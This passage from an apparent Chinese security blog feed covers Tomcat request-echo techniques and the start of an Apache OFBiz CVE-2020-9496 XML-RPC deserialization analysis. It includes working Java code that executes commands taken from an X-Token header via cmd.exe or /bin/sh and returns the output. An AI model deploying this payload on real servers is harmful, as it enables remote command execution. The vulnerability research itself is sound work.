class="hljs-literal">true</span>);        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)                field = getField(clazz.getSuperclass(), fieldName);        &#125;        <span class="hljs-keyword">return</span> field;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getNeededRequestObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-type">ThreadGroup</span> <span class="hljs-variable">threadGroup</span> <span class="hljs-operator">=</span> Thread.currentThread().getThreadGroup();        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> threadGroup.getClass().getDeclaredField(<span class="hljs-string">&quot;threads&quot;</span>);        field.setAccessible(<span class="hljs-literal">true</span>);        Thread[] threads = (Thread[]) field.get(threadGroup);        <span class="hljs-type">boolean</span> <span class="hljs-variable">isEcho</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;        <span class="hljs-type">Object</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; threads.length; i++) &#123;            <span class="hljs-keyword">if</span> (isEcho) <span class="hljs-keyword">break</span>;            <span class="hljs-comment">// Thread 筛选</span>            <span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> threads[i];            <span class="hljs-keyword">if</span> (thread == <span class="hljs-literal">null</span>)                <span class="hljs-keyword">continue</span>;            <span class="hljs-type">String</span> <span class="hljs-variable">threadName</span> <span class="hljs-operator">=</span> thread.getName();            <span class="hljs-keyword">if</span> (!(                    ((threadName.contains(<span class="hljs-string">&quot;http-nio&quot;</span>) || threadName.contains(<span class="hljs-string">&quot;http-apr&quot;</span>)) &amp;&amp; threadName.contains(<span class="hljs-string">&quot;Poller&quot;</span>))                            || (threadName.contains(<span class="hljs-string">&quot;http-bio&quot;</span>) &amp;&amp; threadName.contains(<span class="hljs-string">&quot;AsyncTimeout&quot;</span>))                            || (threadName.contains(<span class="hljs-string">&quot;http-&quot;</span>) &amp;&amp; threadName.contains(<span class="hljs-string">&quot;Acceptor&quot;</span>))            ))                <span class="hljs-keyword">continue</span>;            <span class="hljs-type">Object</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> getFieldValue(thread, <span class="hljs-string">&quot;target&quot;</span>);            <span class="hljs-type">Object</span> <span class="hljs-variable">this0</span> <span class="hljs-operator">=</span> getFieldValue(target, <span class="hljs-string">&quot;this$0&quot;</span>);            <span class="hljs-type">Object</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> getFieldValue(this0, <span class="hljs-string">&quot;handler&quot;</span>);            <span class="hljs-type">Object</span> <span class="hljs-variable">global</span> <span class="hljs-operator">=</span> getFieldValue(handler, <span class="hljs-string">&quot;global&quot;</span>);            java.util.<span class="hljs-type">List</span> <span class="hljs-variable">processors</span> <span class="hljs-operator">=</span> (java.util.List) getFieldValue(global, <span class="hljs-string">&quot;processors&quot;</span>);            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; processors.size(); j++) &#123;                <span class="hljs-keyword">if</span> (isEcho) <span class="hljs-keyword">break</span>;                <span class="hljs-type">Object</span> <span class="hljs-variable">processor</span> <span class="hljs-operator">=</span> processors.get(j);                req = getFieldValue(processor, <span class="hljs-string">&quot;req&quot;</span>);            &#125;        &#125;        <span class="hljs-keyword">return</span> req;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SearchAllRequestObject</span><span class="hljs-params">()</span> &#123;        <span class="hljs-comment">//设置搜索类型包含Request关键字的对象</span>        List&lt;Keyword&gt; keys = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();        keys.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Keyword</span>.Builder().setField_type(<span class="hljs-string">&quot;Request&quot;</span>).build());        <span class="hljs-comment">//定义黑名单</span>        List&lt;Blacklist&gt; blacklists = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();        blacklists.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Blacklist</span>.Builder().setField_type(<span class="hljs-string">&quot;java.io.File&quot;</span>).build());        <span class="hljs-comment">//新建一个广度优先搜索Thread.currentThread()的搜索器</span>        <span class="hljs-type">SearchRequstByBFS</span> <span class="hljs-variable">searcher</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SearchRequstByBFS</span>(Thread.currentThread(),keys);        <span class="hljs-comment">// 设置黑名单</span>        searcher.setBlacklists(blacklists);        <span class="hljs-comment">//打开调试模式,会生成log日志</span>        searcher.setIs_debug(<span class="hljs-literal">true</span>);        <span class="hljs-comment">//挖掘深度为20</span>        searcher.setMax_search_depth(<span class="hljs-number">20</span>);        <span class="hljs-comment">//设置报告保存位置</span>        searcher.setReport_save_path(<span class="hljs-string">&quot;D:\\tmp\\result&quot;</span>);        searcher.searchObject();    &#125;&#125;</code></pre></div><h3 id="配置web-xml"><a href="#配置web-xml" class="headerlink" title="配置web.xml"></a>配置web.xml</h3><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>echo<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.pacemrc.javasec.rcecho.EchoServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>echo<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/echo<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span></code></pre></div><h3 id="配置Tomcat"><a href="#配置Tomcat" class="headerlink" title="配置Tomcat"></a>配置Tomcat</h3><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231204173226358.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>在doGet方法内下断点，debug运行Tomcat</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231204173404288.png"> </p><p>访问<a href="http://localhost:8080/TomcatEcho/echoc%E8%A7%A6%E5%8F%91%E6%96%AD%E7%82%B9">http://localhost:8080/TomcatEcho/echoc触发断点</a></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231204185833293.png"> </p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231204173553507.png"> </p><h2 id="获取所有Request对象"><a href="#获取所有Request对象" class="headerlink" title="获取所有Request对象"></a>获取所有Request对象</h2><p>在断点代码处执行<code>Evaluate Expression</code>，执行以<code>Util.SearchAllRequestObject</code>方法在内存中寻找所有类名中包含<code>Request</code>关键字的对象</p><div class="code-wrapper"><pre><code class="hljs abnf">Util.SearchAllRequestObject()<span class="hljs-comment">;</span></code></pre></div><p>执行完成后会在指定的目录下创建查询结果文件</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231204190104636.png">  </p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231204190121158.png">  </p><p><code>SearchRequstByBFS_result_*.txt</code>文件记录了所有满足查找条件对象，搜索关键字<code>global</code>关键字，发现有3个对象</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231204180827540.png">  </p><h2 id="获取指定Request对象"><a href="#获取指定Request对象" class="headerlink" title="获取指定Request对象"></a>获取指定Request对象</h2><p>根据对象的路径筛选出发起请求的Request对象，在断点代码处执行代码获取当前线程</p><div class="code-wrapper"><pre><code class="hljs autohotkey"><span class="hljs-keyword">Thread</span>.currentThread()</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231204174803050.png"> </p><p>根据<code>SearchRequstByBFS_result_*.txt</code>文件中对象存储的路径判断查找需要的<code>Request</code>对象，以第一个为例</p><div class="code-wrapper"><pre><code class="hljs perl">TargetObject = &#123;org.apache.tomcat.util.threads.TaskThread&#125;    ---&gt; group = &#123;java.lang.ThreadGroup&#125;     ---&gt; threads = &#123;<span class="hljs-class"><span class="hljs-keyword">class</span> [<span class="hljs-title">Ljava</span>.<span class="hljs-title">lang</span>.<span class="hljs-title">Thread</span></span>;&#125;      ---&gt; [<span class="hljs-number">15</span>] = &#123;java.lang.Thread&#125;        ---&gt; target = &#123;org.apache.tomcat.util.net.NioEndpoint<span class="hljs-variable">$Poller</span>&#125;         ---&gt; this<span class="hljs-variable">$0</span> = &#123;org.apache.tomcat.util.net.NioEndpoint&#125;            ---&gt; handler = &#123;org.apache.coyote.AbstractProtocol<span class="hljs-variable">$ConnectionHandler</span>&#125;             ---&gt; global = &#123;org.apache.coyote.RequestGroupInfo&#125;</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231204175212599.png"> </p><p>继续往下查找，发现<code>processors</code>数组列表字段中存储了需要的<code>Request</code>对象</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231204181256443.png"> </p><p>在断点处执行表达式，获取需要的Request对象，实现方法为不断递归反射指定对象</p><div class="code-wrapper"><pre><code class="hljs abnf">Util.getNeededRequestObject()<span class="hljs-comment">;</span></code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231204184845598.png"> </p><h2 id="获取Response对象"><a href="#获取Response对象" class="headerlink" title="获取Response对象"></a>获取Response对象</h2><p>获取需要的Request对象后，即可获取对应的Response对象。要实现服务端可接收我们传入的命令，可通过添加自定义头来实现，服务端接收到自定义头的值后作为命令执行的参数，最后将命令执行的结果写入Response对象的响应体中。</p><p><strong>代码细节</strong></p><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">Object</span> req = Util.getNeededRequestObject();<span class="hljs-keyword">Object</span> resp = req.getClass().getMethod(&quot;getResponse&quot;).invoke(req);String <span class="hljs-keyword">header</span> = (String) req.getClass().getMethod(&quot;getHeader&quot;, String.<span class="hljs-keyword">class</span>).invoke(req, &quot;X-Token&quot;);<span class="hljs-keyword">if</span> (<span class="hljs-keyword">header</span> != <span class="hljs-keyword">null</span> &amp;&amp; !<span class="hljs-keyword">header</span>.isEmpty()) &#123;String[] cmd = <span class="hljs-keyword">null</span>;String os = <span class="hljs-keyword">System</span>.getProperty(&quot;os.name&quot;).toLowerCase();<span class="hljs-keyword">if</span> (os.contains(&quot;win&quot;)) &#123;cmd = <span class="hljs-built_in">new</span> String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, <span class="hljs-keyword">header</span>&#125;;&#125; <span class="hljs-keyword">else</span> &#123;cmd = <span class="hljs-built_in">new</span> String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, <span class="hljs-keyword">header</span>&#125;;&#125;String result = <span class="hljs-built_in">new</span> java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(&quot;\\A&quot;).next();// doWriteresp.getClass().getMethod(&quot;setStatus&quot;, <span class="hljs-type">Integer</span>.<span class="hljs-keyword">TYPE</span>).invoke(resp, <span class="hljs-number">200</span>);try &#123;resp.getClass().getDeclaredMethod(&quot;doWrite&quot;, java.nio.ByteBuffer.<span class="hljs-keyword">class</span>).invoke(resp, java.nio.ByteBuffer.wrap(result.getBytes()));&#125; catch (NoSuchMethodException | IllegalAccessException | InvocationTargetException e) &#123;<span class="hljs-keyword">Class</span> clazz = <span class="hljs-keyword">Class</span>.forName(&quot;org.apache.tomcat.util.buf.ByteChunk&quot;);<span class="hljs-keyword">Object</span> byteChunk = clazz.newInstance();clazz.getDeclaredMethod(&quot;setBytes&quot;, byte[].<span class="hljs-keyword">class</span>, <span class="hljs-type">Integer</span>.<span class="hljs-keyword">TYPE</span>, <span class="hljs-type">Integer</span>.<span class="hljs-keyword">TYPE</span>).invoke(byteChunk, result.getBytes(), <span class="hljs-number">0</span>, result.getBytes().length);resp.getClass().getMethod(&quot;doWrite&quot;, clazz).invoke(resp, <span class="hljs-built_in">new</span> <span class="hljs-keyword">Object</span>[]&#123;byteChunk&#125;);&#125;&#125;</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231204192352464.png"> </p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>漏洞分析</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Apache-OFbiz系列漏洞</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Apache-OFbiz%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Apache-OFbiz%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2020-9496"><a href="#CVE-2020-9496" class="headerlink" title="CVE-2020-9496"></a>CVE-2020-9496</h1><p>Apache OFBiz &lt; 17.12.04</p><h2 id="XML-RPC"><a href="#XML-RPC" class="headerlink" title="XML-RPC"></a>XML-RPC</h2><p>XMLRPC是一个规范和一套实现方法，允许运行在不同操作系统和不同环境中的软件通过互联网进行过程调用。它使用 HTTP 作为传输方式，XML 作为编码方式进行远程过程调用。</p><p><a href="http://xmlrpc.com/">http://xmlrpc.com/</a></p><h2 id="Apache-XML-RPC"><a href="#Apache-XML-RPC" class="headerlink" title="Apache XML-RPC"></a>Apache XML-RPC</h2><p>Apache XML-RPC是XML-RPC的java实现方式，也是通过http协议传输xml格式数据来进行远程过程调用。</p><h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>pom.xml</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.xmlrpc<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>xmlrpc-server<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre></div><p>Calculator.java</p><div class="code-wrapper"><pre><code class="hljs aspectj"><span class="hljs-keyword">package</span> com.pacemrc.xmlrpc;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Calculator</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i1, <span class="hljs-keyword">int</span> i2)</span> </span>&#123;        <span class="hljs-keyword">return</span> i1 + i2;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">subtract</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i1, <span class="hljs-keyword">int</span> i2)</span> </span>&#123;        <span class="hljs-keyword">return</span> i1 - i2;    &#125;&#125;</code></pre></div><p>Server.java</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.pacemrc.xmlrpc;<span class="hljs-keyword">import</span> org.apache.xmlrpc.server.PropertyHandlerMapping;<span class="hljs-keyword">import</span> org.apache.xmlrpc.server.XmlRpcServer;<span class="hljs-keyword">import</span> org.apache.xmlrpc.server.XmlRpcServerConfigImpl;<span class="hljs-keyword">import</span> org.apache.xmlrpc.webserver.WebServer;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Server</span> &#123;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">8080</span>;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-type">WebServer</span> <span class="hljs-variable">webServer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebServer</span>(port);        <span class="hljs-type">XmlRpcServer</span> <span class="hljs-variable">xmlRpcServer</span> <span class="hljs-operator">=</span> webServer.getXmlRpcServer();        <span class="hljs-type">PropertyHandlerMapping</span> <span class="hljs-variable">phm</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PropertyHandlerMapping</span>();        phm.load(Thread.currentThread().getContextClassLoader(), <span class="hljs-string">&quot;XmlRpcServlet.properties&quot;</span>);        <span class="hljs-comment">//这也是一种指定方案</span>        <span class="hljs-comment">//phm.addHandler(&quot;Calculator&quot;, service.Calculator.class);</span>        xmlRpcServer.setHandlerMapping(phm);        <span class="hljs-type">XmlRpcServerConfigImpl</span> <span class="hljs-variable">serverConfig</span> <span class="hljs-operator">=</span> (XmlRpcServerConfigImpl) xmlRpcServer.getConfig();        serverConfig.setEnabledForExtensions(<span class="hljs-literal">true</span>);        serverConfig.setContentLengthOptional(<span class="hljs-literal">false</span>);        webServer.start();    &#125;&#125;</code></pre></div><p>XmlRpcServlet.properties</p><p>在resources目录下创建文件</p><div class="code-wrapper"><pre><code class="hljs abnf"><span class="hljs-attribute">Calculator</span><span class="hljs-operator">=</span>com.pacemrc.xmlrpc.Calculator</code></pre></div><p>运行Server</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231207154752001.png"> </p><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>pom.xml</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.xmlrpc<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>xmlrpc-client<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre></div><p>Client.java</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.xmlrpc.XmlRpcException;<span class="hljs-keyword">import</span> org.apache.xmlrpc.client.XmlRpcClient;<span class="hljs-keyword">import</span> org.apache.xmlrpc.client.XmlRpcClientConfigImpl;<span class="hljs-keyword">import</span> java.net.MalformedURLException;<span class="hljs-keyword">import</span> java.net.URL;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> XmlRpcException, MalformedURLException &#123;        <span class="hljs-type">XmlRpcClientConfigImpl</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XmlRpcClientConfigImpl</span>();        config.setServerURL(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://10.58.120.200:8080/xmlrpc&quot;</span>));        <span class="hljs-type">XmlRpcClient</span> <span class="hljs-variable">client</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XmlRpcClient</span>();        client.setConfig(config);        Object[] params = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">33</span>), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">9</span>)&#125;;        <span class="hljs-type">Integer</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> (Integer) client.execute(<span class="hljs-string">&quot;Calculator.add&quot;</span>, params);        System.out.println(result);    &#125;&#125;</code></pre></div><p>运行客户端，成功调用服务端的类的方法</p><p><img src="/./E:/TyporaIMG/Apache-OFbiz%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E/image-20231207154849606.png"> </p><h3 id="通信流量"><a href="#通信流量" class="headerlink" title="通信流量"></a>通信流量</h3><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/xmlrpc</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/xml<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Apache XML RPC 3.1.3 (Sun HTTP Transport)<span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache<span class="hljs-attribute">Pragma</span><span class="hljs-punctuation">: </span>no-cache<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8080<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>200<span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">methodCall</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">methodName</span>&gt;</span>Calculator.add<span class="hljs-tag">&lt;/<span class="hljs-name">methodName</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">params</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">param</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">i4</span>&gt;</span>33<span class="hljs-tag">&lt;/<span class="hljs-name">i4</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">param</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">i4</span>&gt;</span>9<span class="hljs-tag">&lt;/<span class="hljs-name">i4</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">params</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">methodCall</span>&gt;</span></span></code></pre></div><div class="code-wrapper"><pre><code class="hljs stylus">newInstance:<span class="hljs-number">396</span>, Class (java.lang)getTransletInstance:<span class="hljs-number">455</span>, TemplatesImpl (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xsltc</span>.trax)newTransformer:<span class="hljs-number">486</span>, TemplatesImpl (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xsltc</span>.trax)getOutputProperties:<span class="hljs-number">507</span>, TemplatesImpl (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xsltc</span>.trax)invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)invoke:<span class="hljs-number">497</span>, Method (java<span class="hljs-selector-class">.lang</span>.reflect)invokeMethod:<span class="hljs-number">2170</span>, PropertyUtilsBean (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span>.beanutils)getSimpleProperty:<span class="hljs-number">1332</span>, PropertyUtilsBean (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span>.beanutils)getNestedProperty:<span class="hljs-number">770</span>, PropertyUtilsBean (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span>.beanutils)getProperty:<span class="hljs-number">846</span>, PropertyUtilsBean (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span>.beanutils)getProperty:<span class="hljs-number">426</span>, PropertyUtils (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span>.beanutils)compare:<span class="hljs-number">163</span>, BeanComparator (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span>.beanutils)siftDownUsingComparator:<span class="hljs-number">721</span>, PriorityQueue (java.util)siftDown:<span class="hljs-number">687</span>, PriorityQueue (java.util)heapify:<span class="hljs-number">736</span>, PriorityQueue (java.util)readObject:<span class="hljs-number">795</span>, PriorityQueue (java.util)invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)invoke:<span class="hljs-number">497</span>, Method (java<span class="hljs-selector-class">.lang</span>.reflect)invokeReadObject:<span class="hljs-number">1058</span>, ObjectStreamClass (java.io)readSerialData:<span class="hljs-number">1900</span>, ObjectInputStream (java.io)readOrdinaryObject:<span class="hljs-number">1801</span>, ObjectInputStream (java.io)readObject0:<span class="hljs-number">1351</span>, ObjectInputStream (java.io)readObject:<span class="hljs-number">371</span>, ObjectInputStream (java.io)getResult:<span class="hljs-number">36</span>, SerializableParser (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xmlrpc</span>.parser)endValueTag:<span class="hljs-number">78</span>, RecursiveTypeParserImpl (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xmlrpc</span>.parser)endElement:<span class="hljs-number">185</span>, MapParser (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xmlrpc</span>.parser)endElement:<span class="hljs-number">103</span>, RecursiveTypeParserImpl (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xmlrpc</span>.parser)endElement:<span class="hljs-number">165</span>, XmlRpcRequestParser (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xmlrpc</span>.parser)endElement:-<span class="hljs-number">1</span>, AbstractSAXParser (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xerces</span>.parsers)scanEndElement:-<span class="hljs-number">1</span>, XMLNSDocumentScannerImpl (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xerces</span>.impl)dispatch:-<span class="hljs-number">1</span>, XMLDocumentFragmentScannerImpl<span class="hljs-variable">$FragmentContentDispatcher</span> (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xerces</span>.impl)scanDocument:-<span class="hljs-number">1</span>, XMLDocumentFragmentScannerImpl (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xerces</span>.impl)parse:-<span class="hljs-number">1</span>, XML11Configuration (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xerces</span>.parsers)parse:-<span class="hljs-number">1</span>, XML11Configuration (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xerces</span>.parsers)parse:-<span class="hljs-number">1</span>, XMLParser (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xerces</span>.parsers)parse:-<span class="hljs-number">1</span>, AbstractSAXParser (org<span class="hljs-selector-class">.apache</span><span 